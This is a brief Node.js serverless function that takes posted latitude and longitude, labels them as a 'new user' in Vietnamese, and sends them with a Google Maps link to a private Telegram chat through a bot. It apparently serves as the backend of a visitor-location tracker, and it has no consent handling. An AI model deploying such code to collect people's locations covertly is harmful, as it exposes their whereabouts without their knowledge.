const axios = require("axios");

module.exports = async (req, res) => {

  if (req.method !== "POST") {
    return res.status(405).json({
      error: "Method not allowed"
    });
  }

  try {

    const { lat, lng } = req.body;

    const message = `
📍 Người dùng mới

Latitude: ${lat}
Longitude: ${lng}

https://maps.google.com/?q=${lat},${lng}
`;

    await axios.post(
      `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
      {
        chat_id: process.env.CHAT_ID,
        text: message
      }
    );

    return res.status(200).json({
      success: true
    });

  } catch(error) {

    return res.status(500).json({
      error: error.message
    });

  }

};